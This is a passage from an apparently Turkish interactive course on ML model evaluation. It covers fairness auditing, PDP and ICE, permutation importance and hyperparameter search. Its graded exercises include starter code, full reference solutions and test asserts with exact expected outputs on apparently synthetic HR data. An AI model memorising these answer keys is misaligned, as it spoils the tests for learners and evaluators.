print(grup.groupby("cinsiyet")[["y", "tahmin"]].apply(oranlar).round(3))</pre><p>Cinsiyeti modelden çıkarmak adaleti garanti etmez: şehir, eğitim ya da pozisyon seviyesi cinsiyetle ilişkiliyse (vekil değişken, proxy) model farkı yine öğrenir. Bu yüzden ölçmeden "adil" denmez. Farkı gördüğünde seçeneklerin: eşiği gruplara göre değil süreç düzeyinde gözden geçirmek, veriyi incelemek, sonucu model kartına yazmak ve kararı insan incelemesine bağlamak. Bu bulguları dersin önceki bölümündeki <b>model kartına</b> "Açıklanabilirlik" ve "Adalet denetimi" başlıklarıyla ekle.</p><div class="note"><b>Gerçek işte</b>İK, kredi ve sağlık gibi alanlarda model kararları kişileri doğrudan etkiler; KVKK ve kurum içi etik kurullar "bu kararı nasıl verdiniz?" diye sorar. Ekipler bu yüzden her sürümde PDP, permutation importance, dilim tablosu ve grup metriklerini otomatik rapora koyar. Fairlearn kütüphanesi (<code>MetricFrame</code>) bu tabloyu tek satırda üretir.</div><h3>Arama bütçesi: Halving, Optuna ve erken durdurma</h3><p>GridSearchCV her adayı tüm veriyle eğitir. <b>HalvingGridSearchCV</b> ardışık yarılama (successive halving) yapar: ilk turda tüm adaylar az kaynakla (az satırla) yarışır, en iyi 1/factor kadarı bir sonraki tura daha çok kaynakla geçer. Kötü adaylara bütçe harcanmaz.</p><pre class="py">from sklearn.experimental import enable_halving_search_cv  # deneysel API'yi açar
from sklearn.model_selection import HalvingGridSearchCV

izgara = {"model__C": [0.1, 1.0], "model__class_weight": [None, "balanced"]}
arama = HalvingGridSearchCV(model, izgara, factor=2, scoring="roc_auc", cv=3, random_state=0)
arama.fit(X_tr, y_tr)
print("aday sayıları :", list(arama.n_candidates_))
print("kaynak (satır):", list(arama.n_resources_))
print("en iyi        :", arama.best_params_)</pre><p>Izgara büyüdükçe rastgele ya da Bayesçi arama daha verimlidir. Optuna önceki denemelerin sonucuna bakarak umut verici bölgeden yeni değer önerir ve kötü giden denemeleri erkenden budar (<code>pip install optuna</code>):</p><pre class="code">import optuna
from sklearn.model_selection import cross_val_score

def amac(trial):
    C = trial.suggest_float("C", 1e-3, 100, log=True)
    agirlik = trial.suggest_categorical("class_weight", [None, "balanced"])
    model.set_params(model__C=C, model__class_weight=agirlik)
    return cross_val_score(model, X_tr, y_tr, cv=3, scoring="roc_auc").mean()

calisma = optuna.create_study(direction="maximize")
calisma.optimize(amac, n_trials=40, timeout=120)   # bütçe: deneme sayısı ve süre
print(calisma.best_params)</pre><p><b>Erken durdurma</b> (early stopping) ise tek bir modelin içinde bütçe tasarrufudur: boosting ya da sinir ağı her turda doğrulama kaybını ölçer, <code>n_iter_no_change</code> tur boyunca iyileşme yoksa durur (HistGradientBoosting'de <code>early_stopping=True</code>). Pratik kural: arama bütçesini (deneme sayısı × kat sayısı × eğitim süresi) önceden yaz, kaba aramayla başla, iyi bölgeyi daralt.</p>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Permutation importance hesaplanırken bir sütunun değerleri karıştırılıyor. Neden bu ölçüm <b>test</b> verisinde yapılmalı?',
        o: ['Eğitim verisinde sütun karıştırmak scikit-learn\'de hata verir, bu yüzden test seti zorunludur', 'Test verisinde model, ezberlediği gürültüye değil genellenen ilişkilere ne kadar dayandığını gösterir', 'Test verisi daha küçük olduğu için hesap daha hızlıdır, sonuç ise aynıdır', 'Karıştırmadan sonra model her sütun için yeniden eğitildiğinden ayrı bir veri parçası gerekir'],
        a: 1,
        why: 'Eğitimde ölçülen önem, aşırı öğrenilmiş (ezberlenmiş) ilişkileri de önemli gösterir. Model yeniden eğitilmez; yalnızca karıştırılmış veriyle skor ölçülür. Eğitim verisinde de çalışır, ama anlamı farklıdır.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Ardışık yarılamada (successive halving) her turdaki aday ve kaynak sayısı. Bu kod ne yazdırır?',
        code: 'aday, kaynak, factor = 27, 20, 3\nturlar = []\nwhile aday >= 1:\n    turlar.append((aday, kaynak))\n    if aday == 1:\n        break\n    aday //= factor\n    kaynak *= factor\nprint(turlar)\n',
        o: ['[(27, 20), (9, 60), (3, 180), (1, 540)]', '[(27, 20), (9, 60), (3, 180)]', '[(27, 20), (13, 40), (6, 80), (3, 160), (1, 320)]', '[(27, 540), (9, 180), (3, 60), (1, 20)]'],
        a: 0,
        why: 'Her turda adaylar factor\'e bölünür, aday başına kaynak factor ile çarpılır: 27→9→3→1 aday, 20→60→180→540 satır. Toplam bütçe her turda yaklaşık sabittir (27×20 ≈ 9×60).' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'İki grup için FPR ve FNR. Bu kod ne yazdırır?',
        code: 'y     = [1, 0, 0, 1, 0, 1, 0, 0]\ntahm  = [1, 1, 0, 0, 0, 1, 1, 0]\ngrup  = ["A", "A", "A", "A", "B", "B", "B", "B"]\nfor g in ("A", "B"):\n    s = [(a, t) for a, t, k in zip(y, tahm, grup) if k == g]\n    fp = sum(1 for a, t in s if a == 0 and t == 1)\n    neg = sum(1 for a, t in s if a == 0)\n    fn = sum(1 for a, t in s if a == 1 and t == 0)\n    poz = sum(1 for a, t in s if a == 1)\n    print(g, fp / neg, fn / poz)\n',
        o: ['A 0.5 0.5\nB 0.3333333333333333 0.0', 'A 0.5 0.5\nB 0.5 0.0', 'A 0.25 0.25\nB 0.25 0.0', 'A 1.0 0.5\nB 0.3333333333333333 0.0'],
        a: 0,
        why: 'A: negatifler (y=0) 2 tane, biri yanlış alarm → FPR 0.5; pozitifler 2, biri kaçmış → FNR 0.5. B: 3 negatiften 1 alarm → 1/3; tek pozitif yakalanmış → 0.0.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w1',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>PDP\'yi elle hesapla. <code>pdp_elle(model, X, sutun, degerler)</code>: her değer için X\'in <b>kopyasında</b> <code>sutun</code>\'u o değere sabitle, <code>model.predict_proba(...)[:, 1]</code> ortalamasını al; ortalamaları 4 basamağa yuvarlanmış liste olarak döndür. Testler sahte bir modelle ve gerçek İK modeliyle (sklearn\'ün <code>partial_dependence</code> sonucu) karşılaştırır.</p>',
        guide: ['Sonuç için boş liste aç.', 'Her değerde X.copy() al ve sütunu o değere ata.', 'predict_proba(...)[:, 1].mean() hesapla, round(…, 4) ile listeye ekle.', 'Listeyi döndür.'],
        example: 'import pandas as pd\ndf = pd.DataFrame({"a": [1, 2], "b": [3, 4]})\nkopya = df.copy()\nkopya["a"] = 10\nprint(kopya["a"].tolist(), df["a"].tolist())\n',
        start: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\n\ndef pdp_elle(model, X, sutun, degerler):\n    sonuc = []\n    # TODO: her değer için kopyada sütunu sabitle, ortalama olasılığı ekle\n    return sonuc\n',
        sol: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\n\ndef pdp_elle(model, X, sutun, degerler):\n    sonuc = []\n    for v in degerler:\n        kopya = X.copy()\n        kopya[sutun] = v\n        sonuc.append(round(float(model.predict_proba(kopya)[:, 1].mean()), 4))\n    return sonuc\n',
        tests: 'import numpy as np\nclass Sahte:\n    def predict_proba(self, X):\n        p = (X["a"] * 0.1 + X["b"] * 0.0).to_numpy()\n        return np.column_stack([1 - p, p])\ndf = pd.DataFrame({"a": [1.0, 2.0, 3.0], "b": [5.0, 6.0, 7.0]})\nassert pdp_elle(Sahte(), df, "a", [0.0, 5.0]) == [0.0, 0.5], "a sabitlenince olasılık 0.1*a olmalı"\nassert df["a"].tolist() == [1.0, 2.0, 3.0], "Orijinal X değişmemeli: X.copy() kullan"\nfrom sklearn.inspection import partial_dependence\nref = partial_dependence(model, X_tr, ["level"], kind="average")\nizgara = [float(v) for v in ref["grid_values"][0]]\nelle = pdp_elle(model, X_tr, "level", izgara)\nassert np.allclose(elle, ref["average"][0], atol=1e-4), f"sklearn PDP ile aynı olmalı: {ref[\'average\'][0].round(4)}"\nassert elle[0] > elle[-1], "Gerçek veride seviye arttıkça ortalama ayrılma olasılığı düşüyor"\n',
        hints: ['PDP = sütun sabitken tahminlerin ortalaması.', 'kopya = X.copy(); kopya[sutun] = v; model.predict_proba(kopya)[:, 1].mean()', 'round(float(...), 4) ile listeye ekle.'],
        why: 'scikit-learn\'ün "brute" yöntemi de tam olarak bunu yapar. Kopya almazsan orijinal veriyi bozarsın ve sonraki her hesap yanlış veriyle yapılır.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w2',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Adalet denetimi için <code>grup_metrikleri(y, tahmin, grup)</code> yaz: üç eşit uzunlukta liste (ya da seri) alıp her grup için <code>{"secim": .., "fpr": .., "fnr": ..}</code> döndürsün; değerler 3 basamak. Payda 0 ise metrik <code>None</code> olsun. Gerçek veri testi: Pusula İK\'nın eski kural tabanlı sistemi (seviye 1 → "ayrılır") cinsiyete göre denetleniyor.</p>',
        guide: ['Grupları sorted(set(grup)) ile gez.', 'Her grupta FP, TN, FN, TP sayılarını çıkar.', 'secim = tahmin ortalaması; fpr = FP/(FP+TN); fnr = FN/(FN+TP).', 'Payda 0 ise None yaz, değilse round(…, 3).'],
        example: 'y = [1, 0, 1]\nt = [1, 1, 0]\ntp = sum(1 for a, b in zip(y, t) if a == 1 and b == 1)\nprint(tp)\n',
        start: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nX, y, cinsiyet = ik_verisi()\n# Eski kural tabanlı sistem: seviye 1 olanları "ayrılır" diye işaretliyor\ntahmin = (X["level"] == 1).astype(int)\n\ndef grup_metrikleri(y, tahmin, grup):\n    sonuc = {}\n    # TODO: her grup için secim, fpr, fnr\n    return sonuc\n',
        sol: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nX, y, cinsiyet = ik_verisi()\n# Eski kural tabanlı sistem: seviye 1 olanları "ayrılır" diye işaretliyor\ntahmin = (X["level"] == 1).astype(int)\ndef _oran(pay, payda):\n    return round(pay / payda, 3) if payda else None\n\ndef grup_metrikleri(y, tahmin, grup):\n    y, tahmin, grup = list(y), list(tahmin), list(grup)\n    sonuc = {}\n    for g in sorted(set(grup)):\n        s = [(a, t) for a, t, k in zip(y, tahmin, grup) if k == g]\n        fp = sum(1 for a, t in s if a == 0 and t == 1)\n        tn = sum(1 for a, t in s if a == 0 and t == 0)\n        fn = sum(1 for a, t in s if a == 1 and t == 0)\n        tp = sum(1 for a, t in s if a == 1 and t == 1)\n        sonuc[g] = {"secim": _oran(fp + tp, len(s)), "fpr": _oran(fp, fp + tn), "fnr": _oran(fn, fn + tp)}\n    return sonuc\n',
        tests: 'r = grup_metrikleri([1, 0, 0, 1], [1, 1, 0, 0], ["A", "A", "B", "B"])\nassert r["A"] == {"secim": 1.0, "fpr": 1.0, "fnr": 0.0}, f"A grubu: ikisi de işaretli (seçim 1.0), tek negatif yanlış alarm (FPR 1.0); gelen {r[\'A\']}"\nassert r["B"] == {"secim": 0.0, "fpr": 0.0, "fnr": 1.0}, "B grubu: pozitif kaçırılmış (FNR 1.0)"\nassert grup_metrikleri([0, 0], [1, 0], ["A", "A"])["A"]["fnr"] is None, "Pozitif yoksa FNR tanımsız: None"\ng = grup_metrikleri(y, tahmin, cinsiyet)\nassert g == {\'E\': {\'secim\': 0.251, \'fpr\': 0.237, \'fnr\': 0.707}, \'K\': {\'secim\': 0.265, \'fpr\': 0.238, \'fnr\': 0.674}}, f"Gerçek veride beklenen {\'E\': {\'secim\': 0.251, \'fpr\': 0.237, \'fnr\': 0.707}, \'K\': {\'secim\': 0.265, \'fpr\': 0.238, \'fnr\': 0.674}}, gelen {g}"\n',
        hints: ['Dört hücreyi (TP, FP, TN, FN) grup içinde say.', 'FPR negatiflerin (y=0) içindeki alarm oranıdır; FNR pozitiflerin (y=1) içindeki kaçırma oranıdır.', 'Bölmeden önce paydayı kontrol eden küçük bir yardımcı fonksiyon yaz.'],
        why: 'Seçim oranı demographic parity, FNR farkı equal opportunity ölçüsüdür. Gerçek veride kural, kadınlarda daha çok alarm üretiyor; bu fark model kartına yazılmalı.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w3',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Hata dilimi analizi: <code>hata_dilimi(df, segment, en_az=30)</code>. <code>df</code>\'de <code>y</code>, <code>tahmin</code> ve segment sütunu var. Her segment için <code>(segment_degeri, satir_sayisi, hata_orani)</code> üret (hata oranı 3 basamak, segment değeri <code>str</code>, sayı <code>int</code>); <code>en_az</code>\'dan küçük segmentleri at; hata oranına göre azalan, eşitlikte ada göre artan sırala. Gerçek veri: eski kural sisteminin şehir ve işe alım kaynağına göre hataları.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nX, y, cinsiyet = ik_verisi()\n# Eski kural tabanlı sistem: seviye 1 olanları "ayrılır" diye işaretliyor\ntahmin = (X["level"] == 1).astype(int)\ndf = X.assign(y=y.to_numpy(), tahmin=tahmin.to_numpy())\n\ndef hata_dilimi(df, segment, en_az=30):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nX, y, cinsiyet = ik_verisi()\n# Eski kural tabanlı sistem: seviye 1 olanları "ayrılır" diye işaretliyor\ntahmin = (X["level"] == 1).astype(int)\ndf = X.assign(y=y.to_numpy(), tahmin=tahmin.to_numpy())\n\ndef hata_dilimi(df, segment, en_az=30):\n    hata = df["y"] != df["tahmin"]\n    tablo = hata.groupby(df[segment]).agg(["size", "mean"])\n    sonuc = [(str(k), int(r["size"]), round(float(r["mean"]), 3)) for k, r in tablo.iterrows() if r["size"] >= en_az]\n    return sorted(sonuc, key=lambda t: (-t[2], t[0]))\n',
        tests: 'k = pd.DataFrame({"y": [1, 0, 1, 0, 1], "tahmin": [1, 1, 0, 0, 1], "s": ["a", "a", "b", "b", "c"]})\nassert hata_dilimi(k, "s", en_az=2) == [("a", 2, 0.5), ("b", 2, 0.5)], "c tek satır, elenmeli; a ve b eşit hata, ada göre sıralı"\nassert hata_dilimi(df, "city", 50) == [(\'Eskişehir\', 96, 0.49), (\'İstanbul\', 1309, 0.368), (\'Kocaeli\', 225, 0.364), (\'İzmir\', 213, 0.362), (\'Ankara\', 288, 0.295)], "Şehir dilimi: Bursa ve Antalya (34 satır) elenir"\nassert hata_dilimi(df, "hire_source") == [(\'üniversite\', 136, 0.404), (\'ajans\', 210, 0.386), (\'LinkedIn\', 463, 0.367), (\'kariyer sitesi\', 813, 0.354), (\'referans\', 446, 0.348), (\'iç başvuru\', 131, 0.344)], "İşe alım kaynağı dilimi beklenenle aynı olmalı"\n',
        hints: ['Hata serisi: df["y"] != df["tahmin"]; bunu segment sütununa göre grupla.', '.agg(["size", "mean"]) satır sayısını ve hata oranını birlikte verir.', 'sorted(..., key=lambda t: (-t[2], t[0]))'],
        why: 'Bool hata serisinin ortalaması hata oranıdır. Küçük segmentleri atmak gürültü kaynaklı "en kötü segment" alarmlarını önler; atılanlar raporda ayrıca belirtilmelidir.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w4',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>onem_sirasi(model, X, y)</code> yaz: <code>permutation_importance</code> ile (<code>scoring="roc_auc"</code>, <code>n_repeats=5</code>, <code>random_state=0</code>) her sütunun ortalama önemini hesapla ve sütun adlarını önemden büyüğe sıralı liste olarak döndür. Gerçek İK modeli test verisinde değerlendirilir.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\n\ndef onem_sirasi(model, X, y):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\nfrom sklearn.inspection import permutation_importance\n\ndef onem_sirasi(model, X, y):\n    r = permutation_importance(model, X, y, scoring="roc_auc", n_repeats=5, random_state=0)\n    return [ad for _, ad in sorted(zip(r.importances_mean, X.columns), reverse=True)]\n',
        tests: 's = onem_sirasi(model, X_te, y_te)\nassert sorted(s) == sorted(X_te.columns), "Her sütun bir kez yer almalı"\nassert s[0] == "level", f"Gerçek veride en önemli sütun pozisyon seviyesi (level) olmalı, gelen {s[0]}"\nassert s.index("education") < s.index("work_mode"), "Eğitim, çalışma biçiminden daha önemli çıkmalı"\n',
        hints: ['sklearn.inspection.permutation_importance sonucu importances_mean alanı taşır.', 'zip(r.importances_mean, X.columns) demetlerini büyükten küçüğe sırala.'],
        why: 'Önem ham sütun düzeyinde ölçülür çünkü karıştırma pipeline\'a girmeden önce yapılır; one-hot sütunlarını tek tek yorumlamak zorunda kalmazsın.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w5',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>halving_ara(model, X, y)</code> yaz: <code>HalvingGridSearchCV</code> ile <code>model__C</code> için <code>[0.1, 1.0]</code>, <code>model__class_weight</code> için <code>[None, "balanced"]</code> ızgarasını <code>factor=2</code>, <code>scoring="roc_auc"</code>, <code>cv=3</code>, <code>random_state=0</code> ile ara. Dönüş: <code>(aday_sayilari, en_iyi_parametreler)</code>; ilki her turdaki aday sayısı listesi (<code>int</code>). Deneysel API\'yi açmayı unutma.</p>',
        start: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\n\ndef halving_ara(model, X, y):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\n\ndef ik_verisi():\n    e = veri.oku("pusula_ik", "ik_employees")\n    p = veri.oku("pusula_ik", "ik_positions")\n    d = e.merge(p[["position_id", "level"]], on="position_id")\n    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)\n    d["level"] = d["level"].astype(float)\n    y = (d["term_type"] == "gönüllü").astype(int)\n    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]\n    return X, y, d["gender"]\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.compose import ColumnTransformer\nfrom sklearn.preprocessing import OneHotEncoder\nfrom sklearn.pipeline import Pipeline\nfrom sklearn.linear_model import LogisticRegression\n\nX, y, cinsiyet = ik_verisi()\nX_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(\n    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)\nkategorik = ["education", "city", "work_mode", "hire_source"]\non_isleme = ColumnTransformer(\n    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")\nmodel = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])\nmodel.fit(X_tr, y_tr)\nfrom sklearn.experimental import enable_halving_search_cv\nfrom sklearn.model_selection import HalvingGridSearchCV\n\ndef halving_ara(model, X, y):\n    izgara = {"model__C": [0.1, 1.0], "model__class_weight": [None, "balanced"]}\n    arama = HalvingGridSearchCV(model, izgara, factor=2, scoring="roc_auc", cv=3, random_state=0).fit(X, y)\n    return [int(n) for n in arama.n_candidates_], arama.best_params_\n',
        tests: 'adaylar, en_iyi = halving_ara(model, X_tr, y_tr)\nassert adaylar == [4, 2, 1], f"4 aday factor=2 ile 4 → 2 → 1 iner, gelen {adaylar}"\nassert set(en_iyi) == {"model__C", "model__class_weight"}, "En iyi parametreler iki anahtar içermeli"\nassert en_iyi["model__C"] in (0.1, 1.0)\n',
        hints: ['from sklearn.experimental import enable_halving_search_cv satırı sınıfı içe aktarmadan ÖNCE gelmeli.', 'Eğitilmiş aramanın n_candidates_ ve best_params_ alanları var.'],
        why: 'Halving, ilk turda dört adayı az satırla dener, yarısını eler ve kalanlara daha çok satır verir; son aday tüm veriyle değerlendirilir.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w6',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['pandas'],
        q: '<p>Hatayı bul ve düzelt. <code>ice_egrileri(model, X, sutun, degerler)</code> her satır için bir ICE eğrisi (değer başına olasılık listesi) döndürmeli. İlk çağrıda doğru görünüyor ama çağrıdan sonra analistin X tablosu bozuluyor: <code>sutun</code>\'daki tüm değerler son ızgara değerine dönüşüyor ve sonraki her analiz yanlış çıkıyor.</p>',
        start: 'import numpy as np\nimport pandas as pd\n\ndef ice_egrileri(model, X, sutun, degerler):\n    calisma = X\n    egriler = np.zeros((len(X), len(degerler)))\n    for j, v in enumerate(degerler):\n        calisma[sutun] = v\n        egriler[:, j] = model.predict_proba(calisma)[:, 1]\n    return egriler.round(3).tolist()\n',
        sol: 'import numpy as np\nimport pandas as pd\n\ndef ice_egrileri(model, X, sutun, degerler):\n    calisma = X.copy()\n    egriler = np.zeros((len(X), len(degerler)))\n    for j, v in enumerate(degerler):\n        calisma[sutun] = v\n        egriler[:, j] = model.predict_proba(calisma)[:, 1]\n    return egriler.round(3).tolist()\n',
        tests: 'class Sahte:\n    def predict_proba(self, X):\n        p = (X["a"] * 0.1 + X["b"] * 0.01).to_numpy()\n        return np.column_stack([1 - p, p])\ndf = pd.DataFrame({"a": [1.0, 2.0], "b": [10.0, 20.0]})\ne = ice_egrileri(Sahte(), df, "a", [0.0, 5.0])\nassert e == [[0.1, 0.6], [0.2, 0.7]], f"Her satırın kendi eğrisi olmalı, gelen {e}"\nassert df["a"].tolist() == [1.0, 2.0], "Fonksiyon çağıranın X tablosunu değiştirmemeli"\n',
        hints: ['calisma = X satırı yeni tablo oluşturmaz; aynı nesneye ikinci ad verir.', 'X.copy() ile bağımsız kopya al.'],
        why: 'pandas DataFrame\'i atama ile kopyalanmaz. Açıklama araçları veriyi değiştirerek çalıştığı için her zaman kopya üzerinde çalışmalıdır; aksi hâlde sessiz veri bozulması olur.' },
      { t: 'code',
        id: 'ml-pipeline-degerlendirme-w7',
        stage: 'Meydan okuma',
        diff: 3,
